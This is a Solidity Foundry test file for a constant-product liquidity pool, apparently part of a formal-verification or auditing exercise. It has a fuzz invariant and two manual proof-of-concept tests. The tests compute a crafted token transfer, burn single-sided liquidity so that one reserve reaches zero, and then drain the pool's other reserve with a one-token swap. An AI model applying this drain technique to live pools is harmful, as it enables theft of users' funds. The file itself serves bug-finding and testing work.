// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ERC20} from "../src/ERC20.sol";
import {DummyERC20A} from "../certora/helpers/DummyERC20A.sol";
import {DummyERC20B} from "../certora/helpers/DummyERC20B.sol";
import {CPPSetup} from "./CPPSetup.sol";

contract CPPMiniTest is Test {
    CPPSetup public cpp;
    DummyERC20A public token0;
    DummyERC20B public token1;

    uint256 private constant START_TOKENS = 1000e18;

    address[] users; 
    address private Alice = address(0x2);
    address private Bob = address(0x1);
    function setUp() public {
        token0 = new DummyERC20A();
        token1 = new DummyERC20B();
        cpp = new CPPSetup(address(token0), address(token1));

        
        users.push(Alice);
        users.push(Bob);
        
        for(uint256 i; i<users.length; ++i) {
            address user = users[i];
            // user approves CPPSetUP to transfer assets
            vm.startPrank(user);
            token0.mint(user,START_TOKENS);
            token1.mint(user,START_TOKENS);
            token0.approve(address(cpp), type(uint256).max);
            token1.approve(address(cpp), type(uint256).max);
            vm.stopPrank();
         }
        
        //first deposit
        vm.startPrank(Bob);
        cpp.transferAndMint(1234, 2345);
        vm.stopPrank();

        targetContract(address(cpp));
        targetSender(Alice);
        targetSender(Bob);
    }

/***    @title fuzz test the invariant 
        Check for the invariant that reserve0 is 0 iff reserve1 is 0 and iff totalSupply is 0.

        This did not find the bug even after 100k runs. 
 */
    function invariant_integrityOfTotalSupply() public  view {
        uint256 reserve0 = cpp.getReserve0();
        uint256 reserve1 = cpp.getReserve1();
        uint256 totalSupply = cpp.totalSupply();
        assertEq(reserve0 == 0 , totalSupply == 0);
        assertEq(reserve1 == 0 , totalSupply == 0);
    }


/***    @title Manual show the violation  
        Only a specific computed value can cause the violation 

        run command: forge test --match-test test_manual_bug -vvv
 */

    function test_manual_bug() public  {
        vm.startPrank(Alice);
        cpp.transferAndMint(20,200);
        uint256 liquidity = cpp.balanceOf(Alice);
        uint256 _reserve0 = cpp.getReserve0();
        uint256 _totalSupply = cpp.totalSupply();
        
        /*
         we need _reserve0 == amount0 at the call to:

            amount1 += _getAmountOut(
                amount0,
                _reserve0 - amount0,
                _reserve1 - amount1
            );  


         amount0 === (liquidity * balance0 ) / _totalSupply
         _reserve0 === (liquidity * balance0 ) / _totalSupply 
        simple math we can compute the required balance0:
        
         */

        uint256 balanceForBug = _reserve0 * _totalSupply /liquidity + 1;
        uint256 amountToTransfer = balanceForBug - _reserve0 ;
    
        cpp.externalTransfer(amountToTransfer, 0);
        cpp.burnSingle(true, liquidity);

        // now that we have one reserve 0 the invariant fails
        invariant_integrityOfTotalSupply();
    }

/***
    @title Critical bug demonstration
    Once the invariant is broken, one can swap the entire reserve for just one token 
    run command: forge test --match-test test_manual_continue_to_drain -vvv
 */
    function test_manual_continue_to_drain() public  {
        vm.startPrank(Alice);
        cpp.transferAndMint(20,200);
        uint256 liquidity = cpp.balanceOf(Alice);
        uint256 _reserve0 = cpp.getReserve0();
        uint256 _totalSupply = cpp.totalSupply();
        uint256 balanceForBug = _reserve0 * _totalSupply /liquidity + 1;
        uint256 amountToTransfer = balanceForBug - _reserve0 ;
    
        cpp.externalTransfer(amountToTransfer, 0);
        cpp.burnSingle(true, liquidity);

        // lets continue to drain the protocol
        cpp.transferAndSwap(false, 1);
        console.log(token0.balanceOf(address(cpp)), token1.balanceOf(address(cpp)), cpp.totalSupply());
    }
    
}
